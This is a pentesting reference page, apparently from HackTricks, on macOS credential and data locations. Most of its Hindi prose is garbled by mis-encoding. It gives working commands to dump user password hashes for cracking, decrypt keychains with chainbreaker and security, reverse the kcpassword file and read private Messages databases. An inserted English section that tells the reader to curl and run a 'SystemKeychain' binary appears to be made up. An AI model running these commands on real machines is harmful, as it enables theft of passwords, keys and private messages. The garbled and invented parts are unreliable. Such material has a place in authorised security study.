# macOS рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕реНрдерд╛рди

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## рдкрд╛рд╕рд╡рд░реНрдб

### рдЫрд╛рдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб

рдЫрд╛рдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **`/var/db/dslocal/nodes/Default/users/`** рдореЗрдВ рд╕реНрдерд┐рдд plists рдореЗрдВ рд╣реЛрддрд╛ рд╣реИред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡рдирд▓рд╛рдЗрдирд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА** (рд╣реИрд╢ рдЬрд╛рдирдХрд╛рд░реА рд╕рд╣рд┐рдд) рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**рдЗрд╕ рддрд░рд╣ рдХреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) рдпрд╛ [**рдЗрд╕ рддрд░рд╣ рдХреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ**](https://github.com/octomagon/davegrohl.git) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрд╢ рдХреЛ **рд╣реИрд╢рдХреИрдЯ** **рдлреЙрд░реНрдореЗрдЯ** рдореЗрдВ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рд╡рди-рд▓рд╛рдЗрдирд░ рдЬрд┐рд╕рд╕реЗ рд╣реИрд╢рдХреИрдЯ рдлреЙрд░реНрдореЗрдЯ `-m 7100` (macOS PBKDF2-SHA512) рдореЗрдВ рд╕рднреА рдЧреИрд░-рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдбрдВрдк рд╣реЛрдВрдЧреЗ:

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### рдХреАрдЪреЗрди рдбрдВрдк

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ security рдмрд╛рдЗрдирд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдХреЗ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХрдИ рдкреНрд░реЙрдореНрдкреНрдЯреНрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдпрд╣ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдкреВрдЫреЗрдВрдЧреЗред
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
рдЗрд╕ рдЯрд┐рдкреНрдкрдгреА [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпреЗ рдЙрдкрдХрд░рдг рдЕрдм рдмрд┐рдЧ рд╕рд░ рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реЗ рд╣реИрдВред
{% endhint %}

рд╣рдорд▓рд╛рд╡рд░ рдЕрднреА рднреА **рд░реВрдЯ** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ **keychaindump** рдХреЛ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреЗ рд╕рд╛рде рдЕрдкрдиреА рдЦреБрдж рдХреА рд╢рд░реНрддреЗрдВ рд╣реЛрддреА рд╣реИрдВред рдкрд╣рд▓реЗ рд╣реА рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдХреА рдЧрдИ рддрд░рд╣, **рд▓реЙрдЧрд┐рди рдХреЗ рдмрд╛рдж рдЖрдкрдХрд╛ рдХреАрдЪреЗрди рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдирд▓реЙрдХ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ** рдФрд░ рдЬрдм рддрдХ рдЖрдк рдЕрдкрдиреЗ рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рд╡рд╣ рдЕрдирд▓реЙрдХ рд╣реА рд░рд╣рддрд╛ рд╣реИред рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рд▓рд┐рдП рд╣реИ рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╣рд░ рдмрд╛рд░ рдЕрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдХреАрдЪреЗрди рддрдХ рдкрд╣реБрдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рджрд░реНрдЬ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рди рд╣реЛред рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдиреЗ рдЗрд╕ рд╕реЗрдЯрд┐рдВрдЧ рдХреЛ рдмрджрд▓ рджрд┐рдпрд╛ рд╣реИ рдФрд░ рд╣рд░ рдЙрдкрдпреЛрдЧ рдХреЗ рдмрд╛рдж рдХреАрдЪреЗрди рдХреЛ рд▓реЙрдХ рдХрд░рдиреЗ рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рд╣реИ, рддреЛ keychaindump рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛; рдпрд╣ рдЕрдирд▓реЙрдХ рдХреАрдЪреЗрди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ Keychaindump рдореЗрдореЛрд░реА рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИ рдХреИрд╕реЗ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИред рдЗрд╕ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ "рд╕реБрд░рдХреНрд╖рд╛ рдбреА" рдкреНрд░рдХреНрд░рд┐рдпрд╛ред Apple рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдзрд┐рдХреГрддрддрд╛ рдФрд░ рдЧрдгрд┐рддреАрдп рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдбреАрдорди рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИред Apple рдбреЗрд╡рд▓рдкрд░ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдореЗрдВ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрд╣реБрдд рдХреБрдЫ рдирд╣реАрдВ рдХрд╣рддреА рд╣реИрдВ; рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╡реЗ рд╣рдореЗрдВ рдмрддрд╛рддреЗ рд╣реИрдВ рдХрд┐ рд╕реБрд░рдХреНрд╖рд╛ рдбреА рдХреА рдХреАрдЪреЗрди рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░рддрд╛ рд╣реИред рдЕрдкрдиреЗ рд╢реЛрдз рдореЗрдВ, рдЬреВрд╕реЛ рд╕реБрд░рдХреНрд╖рд╛ рдбреА рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдХреБрдВрдЬреА рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдХрджрдо рдЙрдард╛рдиреЗ рд╣реЛрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдУрдПрд╕ рдПрдХреНрд╕ рд▓реЙрдЧрд┐рди рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдХреАрдЪреЗрди рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрд╕ рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдо рдЙрдард╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред **рд╕реБрд░рдХреНрд╖рд╛ рдбреА рдХреЗ рд╣реАрдк рдХрд╛ рд╕реНрдХреИрди рдХрд░реЗрдВ (keychaindump рдЗрд╕реЗ vmmap рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдХрд░рддрд╛ рд╣реИ)**ред рд╕рдВрднрд╛рд╡рд┐рдд рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА MALLOC\_TINY рдХреЗ рд░реВрдк рдореЗрдВ рдлрд╝реНрд▓реИрдЧ рдХрд┐рдП рдЧрдП рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВред рдЖрдк рдЗрди рд╣реАрдк рдХреА рд╕реНрдерд╛рдиреЛрдВ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump** рдлрд┐рд░ рд▓реМрдЯреЗ рд╣реБрдП рд╣реАрдкреНрд╕ рдХреА рдЦреЛрдЬ рдХрд░реЗрдЧрд╛ 0x0000000000000018 рдХреЗ рдкреНрд░рдХрдЯ рд╣реЛрдиреЗ рдкрд░ред рдпрджрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд 8-рдмрд╛рдЗрдЯ рдорд╛рди рд╡рд░реНрддрдорд╛рди рд╣реАрдк рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ, рддреЛ рд╣рдореЗрдВ рдПрдХ рд╕рдВрднрд╛рд╡рд┐рдд рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдорд┐рд▓ рдЧрдИ рд╣реИред рдпрд╣рд╛рдВ рдПрдХ рдбреАрдУрдмрдлрд╕реНрдХреЗрд╢рди рдХрд╛ рдереЛрдбрд╝рд╛ рд╕рд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ рд╕реНрд░реЛрдд рдХреЛрдб рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╡рд┐рд╢реНрд▓реЗрд╖рдХ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕ рд╕реВрдЪрдирд╛ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдбреЗрдЯрд╛ рд╕реБрд░рдХреНрд╖рд╛рдж рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИред рдпрд╣рд╛рдВ рдХреБрдВрдЬреАрдЪреЗрди рдбрдВрдк рдЖрдЙрдЯрдкреБрдЯ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИред
```bash
sudo ./keychaindump
```
### рдЪреЗрдирдмреНрд░реЗрдХрд░

[**рдЪреЗрдирдмреНрд░реЗрдХрд░**](https://github.com/n0fate/chainbreaker) рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдлреЛрд░реЗрдВрд╕рд┐рдХ рд░реВрдк рд╕реЗ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рдХрд╛рд░ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реА рдЬрд╛ рд╕рдХрддреА рд╣реИ:

* рд╣реИрд╢ рдХрд┐рдВрдЪреЗрди рдкрд╛рд╕рд╡рд░реНрдб, [рд╣реИрд╢рдХреИрдЯ](https://hashcat.net/hashcat/) рдпрд╛ [рдЬреЙрди рдж рд░рд┐рдкрд░](https://www.openwall.com/john/) рдХреЗ рд╕рд╛рде рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд
* рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд╛рд╕рд╡рд░реНрдб
* рд╕рд╛рдорд╛рдиреНрдп рдкрд╛рд╕рд╡рд░реНрдб
* рдирд┐рдЬреА рдХреБрдВрдЬреА
* рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА
* X509 рдкреНрд░рдорд╛рдгрдкрддреНрд░
* рд╕реБрд░рдХреНрд╖рд┐рдд рдиреЛрдЯреНрд╕
* рдПрдкрд▓рд╢реЗрдпрд░ рдкрд╛рд╕рд╡рд░реНрдб

рдХрд┐рдВрдЪреЗрди рдЕрдирд▓реЙрдХ рдкрд╛рд╕рд╡рд░реНрдб, [рд╡реЛрд▓рд╛рдлреЙрдХреНрд╕](https://github.com/n0fate/volafox) рдпрд╛ [рд╡реЛрд▓реЗрдЯрд┐рд▓рд┐рдЯреА](https://github.com/volatilityfoundation/volatility) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА, рдпрд╛ рд╕рд┐рд╕реНрдЯрдордХреА рдЬреИрд╕реЗ рдЕрдирд▓реЙрдХ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕рд╛рде, рдЪреЗрдирдмреНрд░реЗрдХрд░ рднреА рдкреНрд▓реЗрдирдЯреЗрдХреНрд╕реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рджрд╛рди рдХрд░реЗрдЧрд╛ред

рдХрд┐рдВрдЪреЗрди рдХреЛ рдЕрдирд▓реЙрдХ рдХрд░рдиреЗ рдХреЗ рдЗрди рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдПрдХ рдХреЗ рдмрд┐рдирд╛, рдЪреЗрдирдмреНрд░реЗрдХрд░ рд╕рднреА рдЙрдкрд▓рдмреНрдз рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░реЗрдЧрд╛ред

### **рдХрд┐рдВрдЪреЗрди рдХреА рдХреБрдВрдЬреАрдпреЛрдВ рдХреЛ рдбрдВрдк рдХрд░реЗрдВ**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **рд╕рд┐рд╕реНрдЯрдордХреА рдХреЗ рд╕рд╛рде рдХреАрдЪреЗрди рдХреБрдВрдЬреА (рд╕рд╛рде рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб) рдбрдВрдк рдХрд░реЗрдВ**

To dump keychain keys (with passwords) using SystemKey, follow these steps:

1. Open Terminal and run the following command to download SystemKey:
```
curl -O https://github.com/kennytm/SystemKeychain/raw/master/SystemKeychain
```

2. Make the downloaded file executable by running the following command:
```
chmod +x SystemKeychain
```

3. Run the SystemKeychain command with the `-d` option to dump the keychain keys:
```
./SystemKeychain -d
```

4. Enter your user account password when prompted.

5. The keychain keys, along with their passwords, will be dumped and displayed in the Terminal.

By following these steps, you can easily dump keychain keys (including passwords) using SystemKey.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **рдХреАрдЪреЗрди рдХреБрдВрдЬреАрдпреЛрдВ (рд╕рд╛рде рд╣реА рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде) рдХреЛ рд╣реИрд╢ рдХреЛ рдХреНрд░реИрдХ рдХрд░рдХреЗ рдбрдВрдк рдХрд░реЗрдВ**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **рдореЗрдореЛрд░реА рдбрдВрдк рдХреЗ рд╕рд╛рде рдХреАрдЪреЗрди рдХреБрдВрдЬреАрдпреЛрдВ (рд╕рд╛рде рдкрд╛рд╕рд╡рд░реНрдб) рдХреЛ рдбрдВрдк рдХрд░реЗрдВ**

[рдЗрди рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ](..#dumping-memory-with-osxpmem) рдПрдХ **рдореЗрдореЛрд░реА рдбрдВрдк** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреАрдЪреЗрди рдХреА рдХреБрдВрдЬреАрдпреЛрдВ (рд╕рд╛рде рд╣реА рдкрд╛рд╕рд╡рд░реНрдбреЛрдВ) рдХреЛ рдбрдВрдк рдХрд░реЗрдВ**

рдпрджрд┐ рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдирддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХреАрдЪреЗрди рдХреА рдХреБрдВрдЬреАрдпреЛрдВ рдХреЛ рдбрдВрдк рдФрд░ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** рдлрд╝рд╛рдЗрд▓ рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рд▓реЙрдЧрд┐рди рдкрд╛рд╕рд╡рд░реНрдб** рд░рдЦрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ рддрднреА рдЬрдм рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдорд╛рд▓рд┐рдХ рдиреЗ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд▓реЙрдЧрд┐рди рд╕рдХреНрд╖рдо** рдХрд┐рдпрд╛ рд╣реЛред рдЗрд╕рд▓рд┐рдП, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рдмрд┐рдирд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рдЬреЛ рдмрд╣реБрдд рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИ)ред

рдкрд╛рд╕рд╡рд░реНрдб **`/etc/kcpassword`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХреБрдВрдЬреА рд╕реЗ рд▓рдВрдмрд╛ рд╣реИ, рддреЛ рдХреБрдВрдЬреА рдХрд╛ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдЗрд╕рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [**рдЗрд╕**](https://gist.github.com/opshope/32f65875d45215c3677d) рддрд░рд╣ рдХреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

## рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА

### рд╕рдВрджреЗрд╢
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### рд╕реВрдЪрдирд╛рдПрдВ

рдЖрдк `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` рдореЗрдВ рд╕реВрдЪрдирд╛рдПрдВ рдбреЗрдЯрд╛ рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВред

